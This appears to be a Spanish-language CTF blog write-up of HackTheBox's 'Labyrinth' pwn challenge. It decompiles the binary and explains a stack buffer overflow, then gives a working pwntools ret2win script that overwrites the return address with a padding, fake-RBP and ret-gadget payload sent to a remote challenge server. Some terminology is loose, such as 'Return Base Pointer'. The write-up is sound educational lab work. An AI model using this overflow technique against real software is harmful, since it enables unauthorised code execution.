---
title: Labyrinth Pwn CTF - HackTheBox
date: 2025-02-16 11:00:00 +0000
categories: [HacktheBox, CTF, Pwn]
tags: [HacktheBox, CTF, Pwn]
image:
  path: /assets/img/cabeceras_genericas/htb.jpg
  alt:  Labyrinth Pwn CTF - HackTheBox
description: >
  Guía de explotación de vulnerabilidades en el CTF HackTheBox Labyrinth Pwn.
pin: false  
toc: true   
math: false 
mermaid: false 
---

# Analisis del binario

En este CTF se nos proporciona un binario el cual si ejecutamos podremos ver 100 puertas posibles de seleccionar.

![alt text](/assets/img/posts/labyrinth-htb/image.png)

Para comenzar vamos a decompilar el binario con Ghidra.

## Analisis con Ghidra

Como siempre en casi cualquier caso vamos a dirigirnos a la funcion main.

![alt text](/assets/img/posts/labyrinth-htb/image-1.png)


Aquí vamos a ver la función main en la que se inicializan diferentes variables, se ejecuta el la función para dibujar el banner, se dibujan las 100 puertas, etc.

```c
undefined8 main(void)

{
  int iVar1;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  char *letra;
  ulong longitud;
  
  setup();
  banner();
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  fwrite("\nSelect door: \n\n",1,16,stdout);
  for (longitud = 1; longitud < 101; longitud = longitud + 1) {
    if (longitud < 10) {
      fprintf(stdout,"Door: 00%d ",longitud);
    }
    else if (longitud < 100) {
      fprintf(stdout,"Door: 0%d ",longitud);
    }
    else {
      fprintf(stdout,"Door: %d ",longitud);
    }
    if ((longitud % 10 == 0) && (longitud != 0)) {
      putchar(10);
    }
  }
  fwrite(&DAT_0040248f,1,4,stdout);
```

Ahora se inicializar una variable a la que yo llamé letra, se le asginan 16 bytes de memoria y pero posteriormente se seleccionan solo los 5 primeros bytes.

```c
  letra = (char *)malloc(16);
  fgets(letra,5,stdin);
  iVar1 = strncmp(letra,"69",2);
  if (iVar1 != 0) {
    iVar1 = strncmp(letra,"069",3);
    if (iVar1 != 0) goto quesesto;
  }
  fwrite("\nYou are heading to open the door but you suddenly see something on the wall:\n\n\"Fly li ke a bird and be free!\"\n\nWould you like to change the door you chose?\n\n>> "
         ,1,0xa0,stdout);
  fgets((char *)&local_38,0x44,stdin);
quesesto:
  fprintf(stdout,"\n%s[-] YOU FAILED TO ESCAPE!\n\n",&excalmacion);
  return 0;
```
Justo después vemos el primer paso a tener en cuenta. Parece comprobar si el primer input del usuario es 69 o 069.

Si es 69 se muestra la siguiente mensaje:

![alt text](/assets/img/posts/labyrinth-htb/image-2.png)

Aquí nos están dando una pista pero cualquier input nos mostrará el error "YOU FAILED TO ESCAPE!"

Bien, el punto clave aquí es el segundo input tras el 69.

```c
  fgets((char *)&local_38,0x44,stdin);
```
Aquí se está almacenando el segundo input del usuario en la variable local_38 con un tamaño de 0x44 bytes.

Teniendo en cuenta el mensaje anterior y que en el main no hay más llamadas a otras funciones podemos ir pensando que nuestro objetivo es provocar un overflow para saltar a la función que nos permite obtener la flag.

### Funcion EscapePlan

En el código vamos a encontrar una función llamada Escape_plan.

![alt text](/assets/img/posts/labyrinth-htb/image-3.png)

Aquí vamos a ver lo siguiente:

```c

void escape_plan(void)

{
  ssize_t sVar1;
  char clave;
  int flag;
  
  putchar(10);
  fwrite(&DAT_00402018,1,496,stdout);
  fprintf(stdout,
          "\n%sCongratulations on escaping! Here is a sacred spell to help you continue your journey : %s\n"
          ,&DAT_0040220e,&DAT_00402209);
  flag = open("./flag.txt",0);
  if (flag < 0) {
    perror("\nError opening flag.txt, please contact an Administrator.\n\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  while( true ) {
    sVar1 = read(flag,&clave,1);
    if (sVar1 < 1) break;
    fputc((int)clave,stdout);
  }
  close(flag);
  return;
}
```
Este codigo simplemente abre el archivo flag.txt y lo imprime en la terminal junto con unos mensajes de celebración.

No es necesario modificar la función ni hacer nada más simplemente "volar" desde la función main hasta esta función sin que sea llamada desde el main.

# Exploit y funcionamiento

Para poder "volar" sobre el código y saltar a la ubicación en memoria del comienza la funcion escape_plan vamos a necesitar crear un overflow en la variable local_38.

1. El tamaño de la variable son 48 bytes y además podemos escribir en memoria más allá del limite.

Para esto vamos a comenzar llenando los primeros 48 bytes con `A * 48`.

Llenamos memoria con 'A's hasta llegar donde está guardada la dirección de retorno.

2. Al llegar al RBP (Return Base Pointer) debemos limpiarlo ya que cuando una función se ejecuta esta guarda el RBP de la función anterior y crea uno nuevo para la función actual, pone un inicio de su área de trabajo. 

Si no limpiamos el RBP, la referencia para la función escape_plan no será limpia y podría generar errores en la ejecución de la función así como crashear el programa.

En resumen el RBP es "el origen de coordenadas" de la funcion actual y al limpiarlo ayudamos a que la función escape_plan pueda encontrar sus variables correctamente.

3. Antes de inyectar la dirección de memoria donde comienza la función escape_plan, vamos a [alinear][#alinear] el stack para que no se quede desplazado, vamos a asegurarnos del establecer el camino antes de cargar la función escape_plan.

Para esto se necesitan 2 "gadgets" que nos permiten alinear el stack. Son direcciones que utilizaremos como RET, el de la función anterior a la dirección en memoria donde comienza la función escape_plan y el inicio de la función escape_plan.

Esto como hemos mencionado es para asegurarnos de que el flujo está encaminado correctamente, utilizando como trampolín el primer RET que hará saltar al stack a la siguiente valor el cual será el RET de la función escape_plan.

4. Una vez saltamos al RET de escape_plan, esta se ejecutará. 


Para averiguar exactamente las direcciones en memoria que necesitamos debemos centrarnos en encontrar el inicio de la función escape_plan.

![alt text](/assets/img/posts/labyrinth-htb/image-4.png)

Ahora tenemos la dirección de memoria donce comienza la función escape_plan.

Necesitamos el "gadget" para alinear el stack para que no se quede desplazado.

Buscamos la dirección del final de la función cls(), justo antes de la función escape_plan.

![alt text](/assets/img/posts/labyrinth-htb/image-5.png)

Ahora necesitamos crear el script con el flujo que necesitamos para explotar el binario.

## Script

Como el binario se ejecuta en un servidor necesitamos realizar una conexión mediante sockets para poder ejecutar el script.

```python
from pwn import *

# Conectar al servidor
conn = remote('94.237.55.96', 37701)

# Primer input
conn.recvuntil(b">> ")
conn.sendline(b"69")

# Segundo input con exploit
conn.recvuntil(b">> ")
padding = b"A" * 48
fake_rbp = b"\x00" * 8
ret_gadget = p64(0x401254)  # RET de cls()
ret_addr = p64(0x401255)    # escape_plan

payload = padding + fake_rbp + ret_gadget + ret_addr
conn.sendline(payload)

conn.interactive()
```

Basicamente:

1. - Conectar al servidor
2. - Esperar a que se reciban los caracteres ">> "
3. - Enviar el primer input
4. - Esperar a que se reciban los caracteres ">> "
5. - Llenar la variable local_38 con A * 48
6. - Limpiamos el RBP (Return Base Pointer) con un RBP falso
7. - Indicamos que el RET de cls(), justo antes de la función escape_plan.
8. - Indicamos la dirección de escape_plan
9. - Formamos el payload
10. - Enviamos el payload
11. - Iniciamos la interacción - no es neceseario.

## Flag

![alt text](/assets/img/posts/labyrinth-htb/image-6.png)



# Conceptos

Alinear el stack[#alinear]:

Imagina que el stack (la pila) es como una estantería con cajas, y el procesador necesita que las cajas estén colocadas de una manera específica:

1. Sin alinear sería como:
```
[  caja  ]
[cajita]
[   caja grande   ]
```

2. Alineado sería:
```
[  caja  ]
[  caja  ]
[  caja  ]
```

En x86-64 (la arquitectura que estamos usando):
- El stack debe estar alineado a 16 bytes
- Esto significa que la dirección de memoria debe ser divisible por 16
- Es como si cada "caja" tuviera que empezar en una posición múltiplo de 16

¿Por qué es importante?
- Algunas instrucciones del procesador fallan si los datos no están alineados
- Es como intentar meter una caja torcida en la estantería

